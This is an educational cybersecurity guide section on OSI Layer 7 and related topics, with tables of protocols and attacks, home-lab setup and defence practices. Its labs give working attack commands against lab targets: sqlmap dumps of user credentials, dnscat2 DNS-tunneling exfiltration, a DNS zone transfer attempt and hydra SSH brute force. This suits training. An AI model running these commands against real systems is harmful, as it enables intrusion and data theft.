### Formal Definition
The Application Layer provides network services directly to end-user applications. It is the highest layer of the OSI model and interfaces directly with software applications to provide communication functions as needed. It is not the application itself, but the protocols and services applications use to communicate.

### Key Responsibilities
- Providing interfaces for application-to-network communication
- Supporting user authentication and authorization
- Identifying communication partners and resources
- Determining resource availability

### Protocols at Layer 7

| Protocol | Port | Description |
|----------|------|-------------|
| **HTTP** | 80 | Unencrypted web browsing |
| **HTTPS** | 443 | Encrypted web (HTTP over TLS) |
| **DNS** | 53 | Domain Name System |
| **SMTP** | 25/587 | Email sending |
| **IMAP** | 143/993 | Email retrieval |
| **POP3** | 110/995 | Email retrieval |
| **FTP** | 20/21 | File transfer |
| **SFTP** | 22 | Secure file transfer (over SSH) |
| **SSH** | 22 | Secure remote shell |
| **Telnet** | 23 | Insecure remote shell |
| **SNMP** | 161/162 | Network device management |
| **LDAP** | 389/636 | Directory services (AD) |
| **Kerberos** | 88 | Authentication protocol |
| **NTP** | 123 | Time synchronization |
| **DHCP** | 67/68 | Dynamic IP address assignment |
| **gRPC** | various | Google RPC (microservices) |
| **WebSocket** | 80/443 | Full-duplex browser communication |

### Attacks at Layer 7

| Attack | Description | Tool |
|--------|-------------|------|
| **SQL Injection** | Inject SQL code into input fields | `sqlmap`, manual |
| **XSS (Cross-Site Scripting)** | Inject malicious scripts into web pages | Burp Suite, `xsser` |
| **CSRF** | Trick user's browser into making unauthorized requests | Burp Suite |
| **Command Injection** | Inject OS commands via application input | Manual, Burp Suite |
| **Directory Traversal** | Access files outside web root using `../` | `dirb`, manual |
| **HTTP Request Smuggling** | Exploit discrepancies in HTTP parsing between proxies | Burp Suite |
| **DNS Spoofing/Cache Poisoning** | Feed false DNS responses to misdirect traffic | `dnsspoof`, `ettercap` |
| **DNS Tunneling** | Exfiltrate data or establish C2 channel over DNS | `iodine`, `dnscat2` |
| **LDAP Injection** | Manipulate LDAP queries for auth bypass | Manual |
| **SMTP Open Relay** | Use mail server to send spam/phishing | `swaks`, Telnet |
| **SNMP Community String Attack** | Default SNMP community strings leak device config | `snmpwalk`, `onesixtyone` |
| **Slow HTTP (Slowloris)** | Keep many HTTP connections open, exhaust server | `slowhttptest`, `slowloris.py` |
| **Brute Force Auth** | Systematically guess passwords | `hydra`, `medusa`, `burpsuite` |

### Hands-On Lab: Web Application Attacks (DVWA / bWAPP)

**Setup bWAPP (Buggy Web Application):**
```bash
docker run -d -p 80:80 raesene/bwapp
# Access: http://localhost/ — install database on first run
# Login: bee / bug
```

**Lab 1: SQL Injection**
```bash
# In bWAPP: SQLi - GET/Search
# URL: http://localhost/sqli_1.php?title=Iron+Man&action=search

# Basic test - add single quote
http://localhost/sqli_1.php?title='&action=search
# If you see a SQL error → vulnerable!

# Use sqlmap to automate extraction
sqlmap -u "http://localhost/sqli_1.php?title=test&action=search" \
  --dbs --batch
# This dumps all database names

# Get tables from a specific database
sqlmap -u "http://localhost/sqli_1.php?title=test&action=search" \
  -D bWAPP --tables --batch

# Dump user credentials
sqlmap -u "http://localhost/sqli_1.php?title=test&action=search" \
  -D bWAPP -T users --dump --batch
```

**Lab 2: DNS Enumeration and Tunneling**
```bash
# DNS enumeration
nmap --script dns-brute 192.168.1.100
dnsenum --dnsserver 192.168.1.100 targetdomain.local

# Zone transfer attempt (massive info leak if misconfigured)
dig axfr @192.168.1.100 targetdomain.local

# DNS tunneling with dnscat2 (data exfiltration over DNS)
# On attacker server:
sudo apt install ruby -y
gem install dnscat2
dnscat2-server targetdomain.local

# On victim (data is tunneled out via DNS queries!):
./dnscat targetdomain.local
```

**Lab 3: Directory and Service Enumeration**
```bash
# Web directory brute force
gobuster dir -u http://192.168.1.100 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak

# Nikto web vulnerability scanner
nikto -h http://192.168.1.100

# SSH brute force with hydra (against Metasploitable)
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.200 ssh -t 4 -V

# SNMP enumeration (community string = "public")
snmpwalk -v2c -c public 192.168.1.200
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.200
```

### Best Way to Defend Layer 7 (That Will Never Fail)
1. **Web Application Firewall (WAF)** — ModSecurity, AWS WAF, Cloudflare WAF
2. **Input validation + parameterized queries** — never concatenate user input into SQL/OS commands
3. **Disable verbose error messages** — never show DB/stack traces to users
4. **Implement HTTPS everywhere** — HSTS header: `Strict-Transport-Security: max-age=31536000`
5. **Rate limiting and CAPTCHA** — prevent brute force and automated attacks
6. **Change default credentials** — SNMP community strings, admin:admin on web apps
7. **Regular DAST scanning** — OWASP ZAP, Burp Suite Pro in CI/CD pipeline

---

## OSI vs TCP/IP Model

The real-world internet doesn't strictly use all 7 OSI layers — it uses the **TCP/IP (DoD) model** which consolidates some layers:

```
OSI Model                      TCP/IP Model
──────────────────────         ──────────────────────
7 – Application     ┐
6 – Presentation    ├──────►   4 – Application
5 – Session         ┘             (HTTP, HTTPS, DNS, SSH, SMTP...)

4 – Transport       ──────►   3 – Transport
                                  (TCP, UDP, SCTP)

3 – Network         ──────►   2 – Internet
                                  (IP, ICMP, BGP, OSPF)

2 – Data Link       ┐
1 – Physical        ├──────►   1 – Network Access
                    ┘             (Ethernet, Wi-Fi, ARP)

Why it matters for security:
• Wireshark and tcpdump show TCP/IP layers
• Most attack tools target TCP/IP layers
• Cloud security groups (AWS/GCP) work at L3/L4
• WAFs work at L7 (Application in TCP/IP)
• "L4 load balancer" means TCP/UDP load balancing
• "L7 load balancer" means HTTP/HTTPS load balancing
```

---

## Attack Surface Summary Table

| Layer | Data Unit | Key Devices | Key Protocols | Top Attacks | Detection |
|-------|-----------|-------------|---------------|-------------|-----------|
| 7 – Application | Data | Servers, clients, proxies | HTTP, DNS, SMTP, SSH | SQLi, XSS, DNS tunneling | WAF, SIEM, App logs |
| 6 – Presentation | Data | Servers, gateways | TLS, SSL, MIME | SSL strip, Heartbleed, bad certs | testssl.sh, cert monitoring |
| 5 – Session | Data | Servers, session managers | SMB, RPC, SIP | Session hijack, SMB exploits | NetFlow, Zeek/Bro |
| 4 – Transport | Segment/Datagram | Firewalls, load balancers | TCP, UDP | SYN flood, port scan, hijack | Snort, Suricata, NetFlow |
| 3 – Network | Packet | Routers, L3 switches | IP, ICMP, BGP, OSPF | IP spoof, BGP hijack, fragmentation | BGP monitoring, Wireshark |
| 2 – Data Link | Frame | Switches, bridges, APs | Ethernet, ARP, 802.1Q | ARP spoof, MAC flood, VLAN hop | DAI, switch logs, Zeek |
| 1 – Physical | Bits | Hubs, cables, NICs | Ethernet standards | Wiretap, jamming, evil USB | Physical audits, OTDR |

---

## Hands-On Lab Setup

### Recommended Home Lab Setup for All Exercises

**Minimum Requirements:**
- Host machine: 16GB RAM, 4 cores, 100GB free disk
- Virtualization: VirtualBox (free) or VMware Workstation Pro

**VM Setup:**
```
┌─────────────────────────────────────────────────┐
│              VirtualBox NAT Network             │
│                (10.0.2.0/24)                    │
│                                                 │
│  ┌──────────────┐    ┌──────────────────────┐   │
│  │  Kali Linux  │    │  Metasploitable 2    │   │
│  │  (Attacker)  │    │  (Vulnerable Target) │   │
│  │  10.0.2.15   │    │  10.0.2.20           │   │
│  └──────────────┘    └──────────────────────┘   │
│                                                 │
│  ┌──────────────────────────────────────────┐   │
│  │  Ubuntu Server (or DVWA/bWAPP Docker)    │   │
│  │  (Web App Target)  10.0.2.30             │   │
│  └──────────────────────────────────────────┘   │
└─────────────────────────────────────────────────┘
```

**Download URLs:**
```
Kali Linux:       https://www.kali.org/get-kali/#kali-virtual-machines
Metasploitable 2: https://sourceforge.net/projects/metasploitable/
Ubuntu Server:    https://ubuntu.com/download/server
VirtualBox:       https://www.virtualbox.org/wiki/Downloads
```

**Quick VirtualBox NAT Network setup:**
```bash
# In VirtualBox → File → Preferences → Network → NAT Networks → Add
# Name: LabNet
# CIDR: 10.0.2.0/24
# Enable DHCP

# For each VM → Settings → Network → Adapter 1
# Attached to: NAT Network → LabNet
```

**Essential tools to install on Kali:**
```bash
sudo apt update && sudo apt install -y \
  nmap wireshark tcpdump hping3 arpspoof \
  ettercap-graphical bettercap metasploit-framework \
  nikto gobuster sqlmap hydra netcat \
  scapy python3-scapy dnscat2 \
  testssl.sh snmpwalk dnsenum
```

---

## Best Practices & Pro Tips

### The Golden Rules for Each Layer

```
Layer 1: If you can touch it, you can own it.
         → PHYSICAL security is the foundation of ALL security.

Layer 2: Never trust your local network.
         → Enable DAI, 802.1X, DHCP snooping on ALL switches.

Layer 3: Authenticate your routes.
         → RPKI for BGP, route filtering, BCP38 everywhere.

Layer 4: Know what ports are open and why.
         → Run `nmap -sV` against your own systems weekly.

Layer 5: Sessions expire; make them short and random.
         → Implement session timeouts and high-entropy tokens.

Layer 6: Encrypt everything, trust nothing.
         → TLS 1.3 only, disable all legacy cipher suites.

Layer 7: Every input is hostile until proven otherwise.
         → Validate, sanitize, parameterize. Always.
```

### OSI-Mapped Defense Framework (Defense in Depth)

```
                    ZERO TRUST ARCHITECTURE
                    
L7 ─── WAF, DAST scanning, code review, SAST in CI/CD
L6 ─── TLS 1.3, certificate pinning, HSMs for key storage  
L5 ─── Session timeouts, anti-CSRF tokens, secure cookies
L4 ─── Stateful firewall, SYN cookies, IPS/IDS (Snort/Suricata)
L3 ─── ACLs, RPKI/BGP monitoring, IPsec, RFC1918 filtering
L2 ─── DAI, 802.1X NAC, DHCP snooping, port security, VLANs
L1 ─── Physical locks, tamper seals, disabled USB ports, fiber
```

### Troubleshooting Network Issues — OSI Approach

When something breaks, always start from **Layer 1 and work up**:

```bash
# L1: Is the cable/interface up?
ip link show eth0
ethtool eth0

# L2: Are we getting ARP responses?
arping 192.168.1.1
arp -a

# L3: Can we route (ping gateway)?
ping 192.168.1.1
traceroute 8.8.8.8

# L4: Is the service port open?
nc -zv 192.168.1.100 443
nmap -p 443 192.168.1.100

# L5-L7: Is the application responding?
curl -I https://192.168.1.100
telnet 192.168.1.100 25
```

### Cloud Engineering Perspective

| Cloud Service | OSI Relevance |
|---------------|---------------|
| AWS Security Groups | L3/L4 — IP/port filtering |
| AWS WAF | L7 — HTTP inspection |
| AWS Network ACLs | L3/L4 — stateless filtering |
| AWS VPC Peering | L3 — IP routing between VPCs |
| AWS PrivateLink | L4 — private endpoint, no internet routing |
| Azure NSG | L3/L4 — network security groups |
| Cloudflare CDN | L7 — DDoS, WAF, TLS termination |
| Kubernetes NetworkPolicy | L3/L4 — pod-to-pod traffic control |
| Service Mesh (Istio) | L4/L7 — mTLS, traffic routing |

### DevOps Pipeline Security Per Layer

```
Layer 7 (App):     → SAST (Semgrep, SonarQube) in CI/CD
                   → DAST (OWASP ZAP) against staging
                   → Container scanning (Trivy, Snyk)

Layer 4 (Transport): → Secrets in transit = TLS everywhere
                      → Never commit private keys to git

Layer 3 (Network): → Terraform: restrict security group CIDRs
                   → Never 0.0.0.0/0 on sensitive ports

Layer 2 (Data Link): → Disable CDP/LLDP on production switches
                      → VLAN segmentation for prod/dev/staging

Layer 1 (Physical):  → Cloud: handled by provider
                      → On-prem: strict DC access controls
```

---

*Document authored for educational cybersecurity training. All techniques described should be practiced only in authorized, isolated lab environments. Always get written permission before testing any system you don't own.*

*Key reference standards: ISO/IEC 7498-1 (OSI), RFC 793 (TCP), RFC 791 (IPv4), RFC 826 (ARP), RFC 8446 (TLS 1.3)*